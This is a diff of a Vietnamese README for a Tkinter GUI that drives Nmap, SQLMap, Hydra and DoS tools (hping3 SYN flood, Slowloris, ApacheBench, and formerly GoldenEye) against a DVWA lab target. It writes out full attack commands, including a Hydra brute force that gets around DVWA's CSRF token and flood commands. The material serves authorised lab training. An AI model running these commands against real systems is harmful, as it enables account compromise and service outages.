@@ -1,76 +1,151 @@
 # Pentest Lab GUI (Kali Linux)
 
-App giao diện (Python Tkinter — có sẵn trên Kali) để chạy kiểm thử tấn công trong **phòng lab được phép**:
-Nmap, SQLMap, Hydra, và bộ DoS (Hping3 / GoldenEye / Slowloris).
+Ứng dụng giao diện Python Tkinter để chạy kiểm thử bảo mật trong **phòng lab được phép**:
+Nmap, SQLMap, Hydra và bộ DoS gồm **hping3 SYN flood**, ApacheBench, Slowloris.
 
-## Nguyên tắc hoạt động (đúng yêu cầu)
+> HTTP flood (GoldenEye) đã được loại bỏ. Hping3 là công cụ DoS chính và chạy
+> lệnh cố định `hping3 -S --flood -p 80 <IP>`.
 
-1. Nhập **IP mục tiêu 1 lần duy nhất** vào ô trên cùng → bấm **⚡ Ping kiểm tra**.
-2. App chạy `ping -c 4 -W 2 <ip>`:
-   - Ping được → hiển thị **"● IP OK - CÓ KẾT NỐI"**, IP được **khóa** (IPLOCK).
-   - Không ping được → hiển thị **"● KHÔNG CÓ KẾT NỐI"** và **không chạy được lệnh tấn công nào**.
-3. Sau khi IP khóa, **mọi lệnh tấn công tự động dùng IP đó** — không cần nhập lại:
-   - Nmap:     `nmap -sS -T4 -p- <IP>` và `nmap -sV -A <IP>`
-   - Gobuster: `gobuster dir -u http://<IP> -w <wordlist>`
-   - SQLMap:   `sqlmap -u "http://<IP>/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --dbs --level=3` (URL mẫu có `{IP}` tự thay thế)
-   - Hydra:    `hydra -l admin -P <wordlist> -s <port> -t 4 -f -I <IP> http-post-form "/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login:S=Logout"`
-   - DoS:      `hping3 -S --flood -p 80 --rand-source <IP>`, `goldeneye http://<IP> -w 50`, `slowloris <IP> -p 80 -s 500`
+## Quy trình sử dụng
 
-> **Lưu ý path**: Linux phân biệt chữ hoa/chữ thường — `/DVWA` khác `/dvwa`.
-> App mặc định dùng `/DVWA` (đúng với đa số bản DVWA trên Ubuntu/XAMPP).
->
-> **DVWA + CSRF**: DVWA 1.9 trở lên có `user_token` ẩn trong form login. Hydra gửi
-> POST tĩnh nên nếu không xử lý token, mọi lần thử đều bị đẩy về login.php với
-> "CSRF token is incorrect" và Hydra sẽ **không dừng dù đã gặp mật khẩu đúng**.
-> App tự động:
-> 1. GET trang login, lấy `user_token` + `PHPSESSID` (ép `security=low`);
-> 2. Chạy Hydra với `G=0`, `H=Cookie: PHPSESSID=...; security=low`, `user_token=...`;
-> 3. Dùng điều kiện `F=login.php` (redirect khi sai) để token không bị xoay, và
->    tự kill Hydra ngay khi thấy dòng `password: ...` — kể cả khi `hydra -f` không ăn.
+1. Nhập **IP mục tiêu** vào ô trên cùng → bấm **⚡ Ping & Khóa IP**.
+2. App chạy `ping -c 4 -W 2 <IP>`:
+   - Ping được → hiện **"● IP OK - CÓ KẾT NỐI"** và khóa IP (IPLOCK).
+   - Không ping được → hiện **"● KHÔNG CÓ KẾT NỐI"**, không cho chạy lệnh tấn công.
+3. Sau khi khóa IP, mọi tab tự dùng IP đó — không cần nhập lại.
+
+## Các lệnh được sử dụng
+
+### Nmap
+
+- **Quét SYN toàn port, tốc độ cao:**
+  ```bash
+  sudo nmap -sS -T4 -p- --min-rate 1000 <IP>
+  ```
+  `-sS` SYN scan, `-T4` tăng tốc, `-p-` quét đủ 65535 port, `--min-rate 1000`
+  gửi tối thiểu 1000 gói/giây.
+
+- **Quét toàn diện:**
+  ```bash
+  sudo nmap -A <IP>
+  ```
+  `-A` đã bao gồm `-sV` (nhận diện phiên bản dịch vụ), OS detection, script scan
+  mặc định và traceroute — không cần thêm `-sV`.
+
+### SQLMap
+
+```bash
+sqlmap -u "http://<IP>/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
+       --dbs --level 3 --batch
+```
+
+- URL mẫu dùng `{IP}`, app tự thay bằng IP đã khóa.
+- Có thể nhập thêm cookie (ví dụ `PHPSESSID=...; security=low`) trong tab SQLMap.
+- App kiểm tra trước URL: cảnh báo nếu trả về 404 hoặc bị chuyển về `login.php`.
+
+### Hydra
+
+```bash
+hydra -l admin -P <wordlist> -s <port> -t 4 -f -I <IP> http-post-form \
+      "/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login:S=Logout"
+```
+
+- Chọn wordlist trên máy Kali, ví dụ `/usr/share/wordlists/rockyou.txt`
+  (giải nén bằng `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` nếu cần).
+- Port `443` tự thêm `-S` (HTTPS).
+- **DVWA + CSRF:** app tự GET trang login để lấy `user_token` + `PHPSESSID`, ép
+  `security=low`, chạy Hydra với `G=0` và điều kiện `F=login.php`, rồi tự dừng khi
+  thấy mật khẩu đúng — kể cả khi `-f` không hoạt động như mong đợi.
+
+### DoS
+
+- **Hping3 - SYN Flood:**
+  ```bash
+  sudo hping3 -S --flood -p 80 <IP>
+  ```
+  - `-S` gửi gói SYN, `--flood` gửi liên tục hết tốc lực, `-p 80` nhắm port 80.
+  - App dùng cố định lệnh trên (không thêm `-c`, `-i` hay `--rand-source`).
+  - `Tự dừng sau (giây)` mặc định `0` = chạy vô hạn; đặt số giây hoặc bấm
+    **⏹ Dừng (Kill)** để kết thúc.
+
+- **ApacheBench:**
+  ```bash
+  ab -n 1000 -c 10 http://<IP>/
+  ```
+  `-n` tổng số request, `-c` số request đồng thời, `-k` keep-alive (tùy chọn).
+
+- **Slowloris:**
+  ```bash
+  slowloris <IP> -p 80 -s 500
+  ```
+  `-s` số socket giữ mở đồng thời.
 
 ## Cài đặt trên Kali
 
 ```bash
 sudo apt update
-sudo apt install -y nmap sqlmap hydra hping3 gobuster
+sudo apt install -y nmap sqlmap hydra hping3 apache2-utils
 
-# GoldenEye (HTTP flood) — nếu chưa có
-sudo git clone https://github.com/jseidl/GoldenEye.git /opt/goldeneye
-sudo ln -sf /opt/goldeneye/goldeneye.py /usr/local/bin/goldeneye
-
-# Slowloris — nếu chưa có
-sudo git clone https://github.com/gkbrk/slowloris.git /opt/slowloris
+# Slowloris (nếu chưa có)
+sudo test -d /opt/slowloris || \
+  sudo git clone https://github.com/gkbrk/slowloris.git /opt/slowloris
+sudo chmod +x /opt/slowloris/slowloris.py
 sudo ln -sf /opt/slowloris/slowloris.py /usr/local/bin/slowloris
 ```
 
-Wordlist mẫu có sẵn trên Kali:
-- `/usr/share/wordlists/dirb/common.txt` (Gobuster)
-- `/usr/share/wordlists/rockyou.txt` (Hydra — dùng `rockyou.txt.gz` trước nếu file còn nén)
+Tab **🛠️ Quản lý Tools** hiển thị công cụ nào đã cài / còn thiếu và nút sao chép
+lệnh cài đặt. Trạng thái được làm mới khi đổi tab hoặc bấm nút **↻**, nên không
+cần khởi động lại app sau khi cài tool.
 
-## Chạy
+### Slowloris bị báo thiếu
+
+Kiểm tra trong terminal:
+
+```bash
+command -v slowloris
+# Kỳ vọng: /usr/local/bin/slowloris
+
+slowloris --help
+```
+
+Nếu `command -v` không trả về gì, tạo lại liên kết và cấp quyền thực thi:
+
+```bash
+sudo chmod +x /opt/slowloris/slowloris.py
+sudo ln -sf /opt/slowloris/slowloris.py /usr/local/bin/slowloris
+```
+
+Sau đó bấm **↻** ở khối "CÔNG CỤ HỆ THỐNG" hoặc chuyển tab để app quét lại.
+App cũng tự tìm Slowloris tại `/opt/slowloris/slowloris.py` nếu lệnh chưa có
+trong `PATH`.
+
+## Chạy ứng dụng
 
 ```bash
 sudo python3 pentest_lab_gui.py
 ```
 
-- **Tab "Công cụ"** kiểm tra tool nào đã cài / còn thiếu.
-- SYN scan (`-sS`), hping3, slowloris **cần root** → nếu chạy app không phải root, tick ô "Dùng sudo" (app tự prefix `sudo`).
-- Tab DoS có ô xác nhận bắt buộc: chỉ tick khi mục tiêu là **server lab cô lập** — DoS làm treo dịch vụ.
-- Nút **⏹ Dừng** kill **cả cây tiến trình** (kể cả tiến trình con của `sudo`) bằng
-  process group + SIGKILL dự phòng, nên GoldenEye/Slowloris/hping3 dừng thật sự.
-- Lệnh được tạo ngay khi bấm chạy (không còn khoảng trễ), bấm **Dừng** lập tức vẫn kill được.
-- Đóng cửa sổ app cũng tự kill tiến trình DoS đang chạy, không bỏ rơi tiến trình nền.
-- Output được ép không đệm (`stdbuf -oL`, `PYTHONUNBUFFERED=1`) nên log hiện theo thời gian thực.
-- hping3 có ô "Thời gian (giây)" — app tự dừng sau số giây đã set (0 = tự bấm Dừng thủ công);
-  hẹn giờ cũ tự bị hủy khi chạy lệnh mới nên không kill nhầm.
-- hping3 chạy `--flood` **không in từng gói** (chỉ in tổng kết khi dừng) — đây là bình thường,
-  không phải lệnh treo. Ô **"Giả nguồn (--rand-source)"** mặc định bật; nếu switch/NAT của lab
-  chặn IP giả thì target không thấy traffic — bỏ tick để xác nhận hping3 có gửi/nhận thật.
-- hping3 / `nmap -sS` bắt buộc root: hãy chạy `sudo python3 pentest_lab_gui.py` (hoặc tick
-  "Tự động thêm sudo"); app sẽ báo rõ nếu `sudo` đang đòi mật khẩu mà không có terminal.
+## Ghi chú vận hành
+
+- `nmap -sS`, `nmap -A` (OS detection) và hping3 cần quyền root. Nếu app không chạy
+  bằng root, tick ô **"Tự động thêm sudo cho lệnh root"**; app sẽ hỏi mật khẩu sudo
+  qua hộp thoại nếu cần (mật khẩu chỉ giữ trong RAM phiên chạy).
+- Slowloris không bắt buộc root, nhưng cần kết nối được tới IP mục tiêu và port
+  đang mở. Nếu chạy trong lab có giới hạn socket, tăng `ulimit -n` trước khi chạy app.
+- Nút **⏹ Dừng** kill cả cây tiến trình (kể cả tiến trình con của `sudo`) bằng
+  process group + SIGKILL dự phòng, nên mọi lệnh DoS dừng thật sự.
+- Đóng cửa sổ app cũng tự kill tiến trình DoS đang chạy.
+- Output được ép không đệm (`stdbuf`, `PYTHONUNBUFFERED=1`) nên log hiện theo thời gian thực.
+- ApacheBench chạy trong thread riêng, output đọc qua `queue.Queue` nên giao diện
+  không bị treo trong lúc test.
+- Khi hping3 chạy `--flood`, target có thể không thấy phản hồi và hping3 không in
+  từng gói — đây là bình thường; bấm **⏹ Dừng (Kill)** hoặc đặt `Tự dừng sau`.
+- Chỉ dùng Hping3/ApacheBench/Slowloris trên **server lab cô lập**; các công cụ này
+  có thể làm treo dịch vụ.
 
 ## Lưu ý an toàn & pháp lý
 
 - Chỉ chạy trên hệ thống bạn sở hữu hoặc có **giấy phép thử nghiệm bằng văn bản**.
-- Không chạy DoS trên mạng chung/mạng công ty/trường ngoài phạm vi lab cô lập.
-- Kết quả Suricata (event_type: flow, sql_keyword_count, login_fail_count, suricata_alert_count...) nên được quan sát trên server IDS lab riêng.
+- Không chạy DoS trên mạng chung, mạng công ty hoặc mạng trường ngoài phạm vi lab.
+- Kết quả Suricata (`event_type: flow`, `sql_keyword_count`, `login_fail_count`,
+  `suricata_alert_count`...) nên được quan sát trên server IDS lab riêng.
